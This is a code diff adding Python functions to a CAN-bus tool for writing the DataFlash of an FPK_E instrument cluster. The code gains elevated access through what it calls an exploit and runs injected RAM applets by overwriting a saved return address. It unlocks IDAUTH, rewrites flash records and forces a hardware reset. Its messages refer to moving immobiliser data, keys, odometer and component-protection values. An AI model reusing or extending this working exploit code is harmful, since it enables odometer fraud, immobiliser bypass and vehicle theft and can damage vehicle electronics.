+            for attempt in range(1, max(1, attempts) + 1):
+                fpke_write_memory_0x3d(link, src_param, struct.pack("<II", cur_off, groups))
+                fpke_write_memory_0x3d(link, saved_ret_addr, app_entry.to_bytes(4, "little"))
+                raw_res = fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
+                mark = raw_res[256:260]
+                if mark == b"SCAN":
+                    break
+                if mark == b"BUSY" and attempt < attempts:
+                    time.sleep(retry_delay)
+                    continue
+                raise RuntimeError(f"DataFlash blank-check applet marker mismatch at 0x{cur_off:04X}: {mark.hex()}")
+
+            for grp in range(groups):
+                bits = struct.unpack_from("<I", raw_res, grp * 4)[0]
+                base_rel = rel + grp * 128
+                for w_idx in range(32):
+                    w_pos = base_rel + w_idx * 4
+                    if (bits >> w_idx) & 1:
+                        word_mask[w_pos : w_pos + 4] = b"\xff\xff\xff\xff"
+                    else:
+                        clean_buf[w_pos : w_pos + 4] = b"\xff\xff\xff\xff"
+            rel += step_bytes
+            reporter.progress(rel, length, unit="B", detail=f"BlankCheck @ 0x{offset + rel:04X}")
+
+    if not guard_state.get("ram_restored"):
+        raise RuntimeError("Failed to restore applet RAM after DataFlash blank-check")
+    return bytes(clean_buf), word_mask
+
+
+def _build_faci_block_jobs(
+    live_clean_df: bytes,
+    live_mask: bytes | bytearray,
+    target_clean_df: bytes,
+    target_mask: bytes | bytearray,
+    *,
+    vb_size: int = 0x800,
+    pool_end: int = 28 * 0x800,
+    only_offsets: set[int] | None = None,
+) -> list[dict[str, Any]]:
+    """Build power-fail-safe 64-byte FACI block jobs transforming `(live_clean_df, live_mask)` -> `(target_clean_df, target_mask)`."""
+    raw_jobs: list[dict[str, Any]] = []
+    for blk_off in range(0, FPKE_DFLASH_SIZE, 64):
+        if only_offsets is not None and blk_off not in only_offsets:
+            continue
+        live_m16 = 0
+        tgt_m16 = 0
+        same_programmed = True
+        subset_match = True
+        for w in range(16):
+            pos = blk_off + w * 4
+            l_prog = any(live_mask[pos : pos + 4])
+            t_prog = any(target_mask[pos : pos + 4])
+            l_word = live_clean_df[pos : pos + 4]
+            t_word = target_clean_df[pos : pos + 4]
+            if l_prog:
+                live_m16 |= 1 << w
+            if t_prog:
+                tgt_m16 |= 1 << w
+            if l_prog != t_prog or (t_prog and l_word != t_word):
+                same_programmed = False
+            if l_prog and (not t_prog or l_word != t_word):
+                subset_match = False
+
+        if same_programmed:
+            continue
+        if subset_match:
+            do_erase = False
+            prog_mask = tgt_m16 & ~live_m16
+        else:
+            do_erase = True
+            prog_mask = tgt_m16
+        raw_jobs.append(
+            {
+                "blk_off": blk_off,
+                "do_erase": do_erase,
+                "prog_mask": prog_mask,
+                "target_mask16": tgt_m16,
+                "data": bytes(target_clean_df[blk_off : blk_off + 64]),
+            }
+        )
+
+    def _sort_key(job: dict[str, Any]) -> tuple[int, int, int]:
+        off = int(job["blk_off"])
+        if off >= pool_end:
+            return (1000, 0, off)
+        vb_idx = off // vb_size
+        in_vb = off % vb_size
+        # Write record data blocks (high-to-low offset inside VB) BEFORE DRP/header blocks (low-to-high)
+        is_hdr_or_drp = 1 if in_vb < 0x180 else 0
+        order_in_vb = in_vb if is_hdr_or_drp else -in_vb
+        return (vb_idx, is_hdr_or_drp, order_in_vb)
+
+    raw_jobs.sort(key=_sort_key)
+    return raw_jobs
+
+
+def fpke_write_dflash_blocks_in_session(
+    link: FpkeCanLink,
+    block_jobs: list[dict[str, Any]],
+    *,
+    attempts: int = 8,
+    retry_delay: float = 0.15,
+    reporter: OperationReporter = NULL_REPORTER,
+) -> dict[str, Any]:
+    """Execute 64-byte RV40F DataFlash block erase/program jobs in an open level-8 + IDAUTH-unlocked session."""
+    if not block_jobs:
+        return {
+            "blocks_written": 0,
+            "blocks_erased": 0,
+            "words_programmed": 0,
+            "busy_retries": 0,
+            "ram_restored": True,
+        }
+
+    prof = _refine_link_profile_from_stack(link)
+    wr_payload = build_fpke_dflash_write_applet(
+        applet_entry=int(prof["applet_entry"]),
+        caller_return=int(prof["caller_return"]),
+    )
+    erased_cnt = 0
+    words_cnt = 0
+    busy_retries = 0
+    reporter.reset_stage_timer()
+    reporter.progress(0, len(block_jobs), unit="blk", detail="FACI DataFlash Write")
+
+    with _applet_ram_guard(link, wr_payload, param_size=72, save_result=True) as guard_state:
+        prof = _resolve_link_profile(link)
+        app_entry = int(prof["applet_entry"])
+        src_param = int(prof["source_param"])
+        res_addr = int(prof["result_addr"])
+        saved_ret_addr = int(prof["saved_return"])
+        for idx, job in enumerate(block_jobs):
+            blk_off = int(job["blk_off"])
+            do_erase = bool(job["do_erase"])
+            prog_mask = int(job["prog_mask"]) & 0xFFFF
+            blk_data = bytes(job["data"])
+            if len(blk_data) != 64 or blk_off % 64 != 0 or not (0 <= blk_off <= FPKE_DFLASH_SIZE - 64):
+                raise ValueError(f"Invalid DataFlash block job at 0x{blk_off:04X}")
+
+            param = struct.pack("<HHI", blk_off, 1 if do_erase else 0, prog_mask << 16) + blk_data
+            status = 0
+            fstatr = 0
+            for attempt in range(1, max(1, attempts) + 1):
+                fpke_write_memory_0x3d(link, src_param, param)
+                fpke_write_memory_0x3d(link, saved_ret_addr, app_entry.to_bytes(4, "little"))
+                raw_res = fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
+                if raw_res[256:260] != b"SCAN":
+                    raise RuntimeError(
+                        f"DataFlash write applet marker mismatch at 0x{blk_off:04X}: {raw_res[256:260].hex()}"
+                    )
+                status, fstatr = struct.unpack_from("<II", raw_res, 0)
+                if status == 1:
+                    break
+                if status == 6 and attempt < attempts:
+                    busy_retries += 1
+                    time.sleep(retry_delay)
+                    continue
+                err_lbl = {3: "ERSERR (erase failed)", 4: "PRGERR (program failed)", 6: "EEL_BUSY (FENTRYR != 0)"}.get(
+                    status,
+                    f"status={status}",
+                )
+                raise RuntimeError(
+                    tr(
+                        f"Ошибка записи DataFlash по смещению 0x{blk_off:04X}: {err_lbl} (FSTATR=0x{fstatr:08X}).",
+                        f"DataFlash write error at offset 0x{blk_off:04X}: {err_lbl} (FSTATR=0x{fstatr:08X}).",
+                    )
+                )
+
+            if do_erase:
+                erased_cnt += 1
+            words_cnt += bin(prog_mask).count("1")
+            reporter.progress(idx + 1, len(block_jobs), unit="blk", detail=f"0xFF20{blk_off:04X}")
+
+    if not guard_state.get("ram_restored"):
+        raise RuntimeError("Failed to restore applet RAM after DataFlash write")
+    return {
+        "blocks_written": len(block_jobs),
+        "blocks_erased": erased_cnt,
+        "words_programmed": words_cnt,
+        "busy_retries": busy_retries,
+        "payload_sha256": hashlib.sha256(wr_payload).hexdigest(),
+        "ram_restored": True,
+    }
+
+
+def fpke_trigger_swresa_reset(
+    link: FpkeCanLink,
+    *,
+    wake_seconds: float = 1.2,
+    reporter: OperationReporter = NULL_REPORTER,
+) -> dict[str, Any]:
+    """Trigger immediate hardware `SWRESA` reset (`0xFFF80A04`) so `R_EEL_Startup` + `NvM_ReadAll` reloads DataFlash without `NvM_WriteAll`."""
+    prof = _refine_link_profile_from_stack(link)
+    app_entry = int(prof["applet_entry"])
+    saved_ret_addr = int(prof["saved_return"])
+    exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")
+    cur_saved_ret = fpke_read_memory_0x23(link, saved_ret_addr, 4)
+    if cur_saved_ret != exp_caller_ret:
+        raise RuntimeError(
+            f"Unexpected saved return at 0x{saved_ret_addr:08X} before SWRESA reset: "
+            f"{cur_saved_ret.hex()} (expected {exp_caller_ret.hex()})"
+        )
+    rst_payload = build_fpke_swresa_reset_applet()
+    fpke_write_memory_0x3d(link, app_entry, rst_payload)
+    trigger_req = (
+        b"\x3d\x44"
+        + saved_ret_addr.to_bytes(4, "big")
+        + (4).to_bytes(4, "big")
+        + app_entry.to_bytes(4, "little")
+    )
+    with contextlib.suppress(Exception):
+        link.send_uds(trigger_req)
+        link.receive_uds(timeout=0.25)
+    link.level8_active = False
+    link._stack_profile_verified = False
+
+    if wake_seconds > 0:
+        time.sleep(min(1.5, max(0.05, wake_seconds * 0.35)))
+    link.start_keepalive()
+    if wake_seconds > 0:
+        time.sleep(min(0.8, max(0.02, wake_seconds * 0.2)))
+
+    live_ident: list[dict[str, str]] = []
+    with contextlib.suppress(Exception):
+        link.request_uds(b"\x10\x01", 0x50, timeout=1.5)
+        for did, ru_l, en_l, is_hex in (
+            (0xF187, "Номер детали", "Part number", False),
+            (0xF190, "VIN", "VIN", False),
+            (0x0600, "Кодирование", "Coding", True),
+        ):
+            with contextlib.suppress(Exception):
+                resp = link.request_uds(struct.pack(">BH", 0x22, did), 0x62, timeout=1.2)
+                raw_v = resp[3:]
+                val = raw_v.hex().upper() if is_hex else raw_v.decode("latin1", errors="replace").strip("\x00 ")
+                live_ident.append({"did": f"{did:04X}", "label_ru": ru_l, "label_en": en_l, "value": val})
+    reporter.info(
+        tr(
+            "Аппаратный перезапуск приборной панели (SWRESA) выполнен — обновлённые данные загружены в ОЗУ.",
+            "Hardware cluster reset (SWRESA) completed — updated DataFlash records loaded into RAM.",
+        )
+    )
+    return {
+        "method": "swresa_0xfff80a04",
+        "payload_sha256": hashlib.sha256(rst_payload).hexdigest(),
+        "ident_after": live_ident,
+    }
+
+
+def can_fpke_write_dflash(
+    port: str,
+    candidate_dflash: bytes | Path,
+    *,
+    interface: str = "slcan",
+    base_dflash: bytes | Path | None = None,
+    cflash_bytes: bytes | None = None,
+    session_dir: Path | None = None,
+    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
+    wake_seconds: float = 4.0,
+    full_rewrite: bool = False,
+    allow_foreign: bool = False,
+    reset_after: bool = True,
+    keep_open: bool = True,
+    bus: Any | None = None,
+    reporter: OperationReporter = NULL_REPORTER,
+) -> dict[str, Any]:
+    """Write modified FPK_E DataFlash changes or a full 64 KiB DataFlash backup over CAN with hardware Blank-Check & readback verification.
+
+    Workflow:
+      1. Establishes or reuses vendor level 8 (`0xFEDF3113 = 8`).
+      2. Reads Extra Area (`0xFF300000`), unlocks hardware `IDAUTH` (`IDST == 0`), and saves a live 64 KiB `Dflash_before.bin` backup.
+      3. Refuses foreign-cluster dumps (`FD11` identity mismatch) unless `allow_foreign=True`.
+      4. In smart EEL mode (`base_dflash` provided and `not full_rewrite`), extracts semantic EEL updates, blank-checks
+         `VB_head` & `VB_next` on live hardware, and appends records into blank cells with **zero flash erases** (`do_erase=0`).
+         In `full_rewrite` / backup restore mode, blank-checks all 64 KiB and writes changed 64B blocks.
+      5. Verifies every written block via hardware Blank-Check readback (`BCST` + bytes) and full 64 KiB `Dflash_readback.bin`.
+      6. Relocks `IDAUTH` and triggers immediate `SWRESA` hardware reset so `NvM_ReadAll` loads the new records without
+         `NvM_WriteAll` overwriting them from stale RAM.
+    """
+    from contitool.can.workflows import default_session_dir
+
+    verify_fpke_self_tests()
+    cand_bytes = Path(candidate_dflash).read_bytes() if isinstance(candidate_dflash, (str, Path)) else bytes(candidate_dflash)
+    if len(cand_bytes) != FPKE_DFLASH_SIZE or not is_fpke_dflash(cand_bytes):
+        raise ValueError(
+            tr(
+                f"Некорректный образ DataFlash FPK_E ({len(cand_bytes)} Б): требуется валидный дамп 65 536 байт с пулом EEL T01.",
+                f"Invalid FPK_E DataFlash image ({len(cand_bytes)} B): expected a valid 65,536-byte EEL T01 dump.",
+            )
+        )
+    base_bytes = (
+        Path(base_dflash).read_bytes()
+        if isinstance(base_dflash, (str, Path))
+        else (bytes(base_dflash) if base_dflash is not None else None)
+    )
+
+    out_dir = session_dir or default_session_dir(None, "fpke_write")
+    out_dir.mkdir(parents=True, exist_ok=True)
+    before_path = out_dir / "Dflash_before.bin"
+    readback_path = out_dir / "Dflash_readback.bin"
+    dflash_path = out_dir / "Dflash.bin"
+    extra_path = out_dir / "ExtraArea.bin"
+    report_path = out_dir / "fpke_write_report.json"
+    can_log_path = out_dir / "fpke.can.log"
+
+    total_steps = 6 if reset_after else 5
+    started = time.monotonic()
+
+    with _managed_fpke_link(port, interface=interface, log_path=out_dir / "can.jsonl", bus=bus, keep_open=keep_open) as link:
+        idauth_unlocked = False
+        try:
+            # Step 1: Level 8 access
+            reporter.step(1, total_steps, tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"))
+            exploit_info = fpke_ensure_level8(
+                link,
+                frame_delay=frame_delay,
+                wake_seconds=wake_seconds,
+                reporter=reporter,
+            )
+
+            # Step 2: Extra Area + IDAUTH unlock + live Dflash_before.bin backup
+            reporter.step(
+                2,
+                total_steps,
+                tr(
+                    "Разблокировка IDAUTH и резервное чтение текущего DataFlash (64 КБ)",
+                    "Unlocking IDAUTH & backing up live DataFlash (64 KB)",
+                ),
+            )
+            extra_bytes, extra_meta = _read_verified_extra_area(link, label="Extra Area", reporter=reporter)
+            atomic_write(extra_path, extra_bytes)
+            extra_info = analyze_fpke_extra_area(extra_bytes)
+            candidate_idcode = bytes(extra_bytes[0x50:0x60])
+
+            idst_before = fpke_read_memory_0x23(link, IDST_ADDR, 4)
+            idst_after = fpke_idauth(link, candidate_idcode)
+            if idst_after != b"\x00\x00\x00\x00":
+                raise RuntimeError(
+                    tr(
+                        f"Аппаратный IDAUTH отклонил IDCODE приборной панели (IDST={idst_after.hex()}). Запись отменена.",
+                        f"Hardware IDAUTH rejected cluster IDCODE (IDST={idst_after.hex()}). Write aborted.",
+                    )
+                )
+            idauth_unlocked = True
+
+            dflash_before, before_meta = _read_verified_dflash(
+                link,
+                use_stream=False,
+                label="DataFlash (backup)",
+                reporter=reporter,
+            )
+            atomic_write(before_path, dflash_before)
+            before_info = analyze_fpke_dflash(dflash_before, cflash_bytes)
+            cand_info = analyze_fpke_dflash(cand_bytes, cflash_bytes)
+
+            # Foreign cluster safety check (FD11 identifier & vendor keys in EEL 0x63)
+            live_fd11 = before_info.get("fd11_identifier")
+            cand_fd11 = cand_info.get("fd11_identifier")
+            if live_fd11 and cand_fd11 and live_fd11 != cand_fd11 and not allow_foreign:
+                raise RuntimeError(
+                    tr(
+                        f"Отказано в прямой записи чужого дампа DataFlash: идентификатор FD11 в дампе ({cand_fd11}) "
+                        f"не совпадает с подключённой приборной панелью ({live_fd11}). "
+                        "Для переноса иммо, ключей, пробега и CP используйте вкладку «Перенос из донора».",
+                        f"Refusing to write a foreign cluster DataFlash dump directly: candidate FD11 ({cand_fd11}) "
+                        f"does not match connected cluster ({live_fd11}). "
+                        "Use the “Donor transfer” tab to transfer immo, keys, odometer, and CP safely.",
+                    )
+                )
+
+            # Step 3: Hardware Blank-Check & differential block job calculation
+            reporter.step(
+                3,
+                total_steps,
+                tr(
+                    "Аппаратный Blank-Check и расчёт изменяемых блоков DataFlash",
+                    "Hardware Blank-Check & calculating DataFlash block updates",
+                ),
+            )
+            lay = fpke_eel_layout(cflash_bytes, dflash_before)
+            vb_sz = lay["vb"]
+            n_vb = lay["n_vb"]
+            pool_end = lay["base"] + n_vb * vb_sz
+
+            ref_base = base_bytes if base_bytes is not None else dflash_before
+            change_summary = summarize_fpke_dflash_changes(ref_base, cand_bytes, cflash_bytes)
+            eel_updates = extract_fpke_eel_updates(ref_base, cand_bytes, cflash_bytes)
+            use_smart_eel = (not full_rewrite) and bool(eel_updates) and bool(change_summary.get("is_pure_eel_update"))
+
+            if use_smart_eel:
+                write_mode = "smart_eel_append"
+                live_clean_df, live_mask = normalize_fpke_dflash_for_faci(dflash_before, cflash_bytes)
+                blocks_live, _ = eel_parse_pool(lay, live_clean_df, live_mask)
+                active_nums = {b["vb"] for b in blocks_live if b["state"] == "active"}
+                ring_start = 0
+                if 0 in active_nums and (n_vb - 1) in active_nums and len(active_nums) < n_vb:
+                    for c_vb in sorted(active_nums):
+                        if ((c_vb - 1) % n_vb) not in active_nums:
+                            ring_start = c_vb
+                            break
+                active_sorted = sorted(
+                    (b for b in blocks_live if b["state"] == "active"),
+                    key=lambda blk: (blk["ec"] or 0, (blk["vb"] - ring_start) % n_vb),
+                )
+                head_vb = active_sorted[-1]["vb"]
+                scan_vbs = [head_vb, (head_vb + 1) % n_vb, (head_vb + 2) % n_vb]
+                live_clean_mut = bytearray(live_clean_df)
+                live_mask_mut = bytearray(live_mask)
+                scanned_blk_offsets: set[int] = set()
+                for v_idx in scan_vbs:
+                    vb_off = lay["base"] + v_idx * vb_sz
+                    bc_slice, bc_mask = fpke_read_dflash_blank_checked(
+                        link,
+                        offset=vb_off,
+                        length=vb_sz,
+                        cpu_dflash=dflash_before,
+                        reporter=reporter,
+                    )
+                    live_clean_mut[vb_off : vb_off + vb_sz] = bc_slice
+                    live_mask_mut[vb_off : vb_off + vb_sz] = bc_mask
+                    for bo in range(vb_off, vb_off + vb_sz, 64):
+                        scanned_blk_offsets.add(bo)
+
+                live_clean_df = bytes(live_clean_mut)
+                live_mask = live_mask_mut
+                synth_before_mask = eel_faci_word_mask(lay, live_clean_df)
+                appended_df = eel_append_records(live_clean_df, eel_updates, cflash_bytes)
+                target_clean_df, target_mask = normalize_fpke_dflash_for_faci(appended_df, cflash_bytes)
+                # Preserve exact hardware BCST on untouched words inside scanned VBs so only newly appended EEL words are programmed
+                target_clean_mut = bytearray(target_clean_df)
+                target_mask_mut = bytearray(target_mask)
+                for bo in scanned_blk_offsets:
+                    for w in range(16):
+                        pos = bo + w * 4
+                        newly_added = (not any(synth_before_mask[pos : pos + 4])) and any(target_mask_mut[pos : pos + 4])
+                        if not newly_added:
+                            target_mask_mut[pos : pos + 4] = live_mask[pos : pos + 4]
+                            target_clean_mut[pos : pos + 4] = live_clean_df[pos : pos + 4]
+                target_clean_df = bytes(target_clean_mut)
+                target_mask = target_mask_mut
+                block_jobs = _build_faci_block_jobs(
+                    live_clean_df,
+                    live_mask,
+                    target_clean_df,
+                    target_mask,
+                    vb_size=vb_sz,
+                    pool_end=pool_end,
+                    only_offsets=scanned_blk_offsets,
+                )
+            else:
+                write_mode = "full_blank_checked_diff"
+                live_clean_df, live_mask = fpke_read_dflash_blank_checked(
+                    link,
+                    offset=0,
+                    length=FPKE_DFLASH_SIZE,
+                    cpu_dflash=dflash_before,
+                    reporter=reporter,
+                )
+                target_clean_df, target_mask = normalize_fpke_dflash_for_faci(cand_bytes, cflash_bytes)
+                block_jobs = _build_faci_block_jobs(
+                    live_clean_df,
+                    live_mask,
+                    target_clean_df,
+                    target_mask,
+                    vb_size=vb_sz,
+                    pool_end=pool_end,
+                )
+
+            # Step 4: Uninterruptible FACI Erase/Program
+            reporter.step(
+                4,
+                total_steps,
+                tr(
+                    f"Запись в DataFlash ({len(block_jobs)} бл. по 64 Б)",
+                    f"Writing to DataFlash ({len(block_jobs)} × 64 B blocks)",
+                ),
+            )
+            if block_jobs:
+                reporter.info(
+                    tr(
+                        "Идёт аппаратная запись DataFlash (RV40F FACI) — НЕ отключайте питание приборной панели!",
+                        "Hardware DataFlash write (RV40F FACI) in progress — DO NOT disconnect cluster power!",
+                    )
+                )
+                with reporter.uninterruptible():
+                    write_stats = fpke_write_dflash_blocks_in_session(link, block_jobs, reporter=reporter)
+            else:
+                write_stats = {
+                    "blocks_written": 0,
+                    "blocks_erased": 0,
+                    "words_programmed": 0,
+                    "busy_retries": 0,
+                    "ram_restored": True,
+                }
+                reporter.info(
+                    tr(
+                        "Все целевые данные уже записаны в DataFlash приборной панели (0 изменённых блоков).",
+                        "All target data is already present in cluster DataFlash (0 blocks changed).",
+                    )
+                )
+
+            # Step 5: Hardware Blank-Check & Full 64 KB Readback Verification
+            reporter.step(
+                5,
+                total_steps,
+                tr(
+                    "Контрольное чтение и побайтовая верификация DataFlash",
+                    "Readback & byte-for-byte DataFlash verification",
+                ),
+            )
+            verified_pages: set[int] = {int(j["blk_off"]) & ~0x7F for j in block_jobs}
+            for page_off in sorted(verified_pages):
+                rb_slice, rb_mask = fpke_read_dflash_blank_checked(
+                    link,
+                    offset=page_off,
+                    length=128,
+                    cpu_dflash=None,
+                    reporter=reporter,
+                )
+                for j in block_jobs:
+                    bo = int(j["blk_off"])
+                    if not (page_off <= bo < page_off + 128):
+                        continue
+                    rel_bo = bo - page_off
+                    got_64 = rb_slice[rel_bo : rel_bo + 64]
+                    exp_64 = bytes(j["data"])
+                    got_m16 = sum((1 << w) for w in range(16) if any(rb_mask[rel_bo + w * 4 : rel_bo + w * 4 + 4]))
+                    exp_m16 = int(j["target_mask16"])
+                    if got_64 != exp_64 or got_m16 != exp_m16:
+                        raise RuntimeError(
+                            tr(
+                                f"Ошибка верификации блока DataFlash 0x{bo:04X}: BCST=0x{got_m16:04X} (ожидался 0x{exp_m16:04X}).",
+                                f"DataFlash block verification failed at 0x{bo:04X}: BCST=0x{got_m16:04X} (expected 0x{exp_m16:04X}).",
+                            )
+                        )
+
+            dflash_readback, readback_meta = _read_verified_dflash(
+                link,
+                use_stream=False,
+                label="DataFlash (verify)",
+                reporter=reporter,
+            )
+            atomic_write(readback_path, dflash_readback)
+            atomic_write(dflash_path, dflash_readback)
+
+            # Verify every updated EEL record in the full 64 KB readback image
+            lay_rb = fpke_eel_layout(cflash_bytes, dflash_readback)
+            for ident, expected_rec in eel_updates.items():
+                got_rec, got_src = eel_read_record_any(lay_rb, dflash_readback, ident)
+                if got_src.get("generation") != "current" or got_rec != expected_rec:
+                    raise RuntimeError(
+                        tr(
+                            f"Контрольная проверка записи EEL 0x{ident:02X} после чтения DataFlash не пройдена!",
+                            f"Post-write verification failed for EEL record 0x{ident:02X} in DataFlash readback!",
+                        )
+                    )
+
+            idst_relock = fpke_idauth(link, b"\x00" * 16)
+            idauth_unlocked = False
+
+            # Step 6: Immediate SWRESA hardware reset so R_EEL_Startup + NvM_ReadAll loads new records into RAM
+            reset_info: dict[str, Any] | None = None
+            if reset_after and block_jobs:
+                reporter.step(
+                    6,
+                    total_steps,
+                    tr(
+                        "Аппаратный перезапуск приборки (SWRESA) и проверка данных в ОЗУ",
+                        "Hardware cluster reset (SWRESA) & live RAM verification",
+                    ),
+                )
+                reset_info = fpke_trigger_swresa_reset(link, wake_seconds=wake_seconds, reporter=reporter)
+
+            prof = _resolve_link_profile(link)
+            readback_secrets = analyze_fpke_dflash(dflash_readback, cflash_bytes)
+            elapsed_s = round(time.monotonic() - started, 3)
+            report: dict[str, Any] = {
+                "ok": True,
+                "target": prof["target_label"],
+                "sw_profile": prof["name"],
+                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
+                "port": port,
+                "interface": interface,
+                "mode": write_mode,
+                "elapsed_s": elapsed_s,
+                "blocks_written": write_stats["blocks_written"],
+                "blocks_erased": write_stats["blocks_erased"],
+                "words_programmed": write_stats["words_programmed"],
+                "busy_retries": write_stats["busy_retries"],
+                "changed_eel_ids": change_summary["changed_eel_ids"],
+                "short_summary": change_summary["short_summary"],
+                "summary_lines": change_summary["lines"],
+                "dflash_before_sha256": hashlib.sha256(dflash_before).hexdigest(),
+                "dflash_readback_sha256": hashlib.sha256(dflash_readback).hexdigest(),
+                "dflash_before_path": str(before_path),
+                "dflash_readback_path": str(readback_path),
+                "dflash_path": str(dflash_path),
+                "extra_path": str(extra_path),
+                "session_dir": str(out_dir),
+                "exploit": exploit_info,
+                "idauth": {
+                    "candidate_idcode": candidate_idcode.hex(),
+                    "accepted": True,
+                    "idst_before": idst_before.hex(),
+                    "idst_after_idcode": idst_after.hex(),
+                    "idst_after_relock": idst_relock.hex(),
+                },
+                "extra_area": extra_info,
+                "extra": extra_meta,
+                "before_read": before_meta,
+                "readback_read": readback_meta,
+                "secrets": readback_secrets,
+                "reset": reset_info,
+                "ident": (reset_info or {}).get("ident_after") or [],
+            }
+            atomic_write(report_path, (json.dumps(report, indent=2, ensure_ascii=False) + "\n").encode("utf-8"))
+            reporter.success(
+                tr(
+                    f"Запись DataFlash успешно завершена и проверена ({write_stats['blocks_written']} бл., "
+                    f"стёрто {write_stats['blocks_erased']}, {elapsed_s:.1f} с).",
+                    f"DataFlash write completed and verified ({write_stats['blocks_written']} blocks, "
+                    f"erased {write_stats['blocks_erased']}, {elapsed_s:.1f} s).",
+                )
+            )
+            return report
+        finally:
+            if idauth_unlocked:
+                with contextlib.suppress(Exception):
+                    fpke_idauth(link, b"\x00" * 16)
+            with contextlib.suppress(Exception):
+                link.save_can_log(can_log_path)
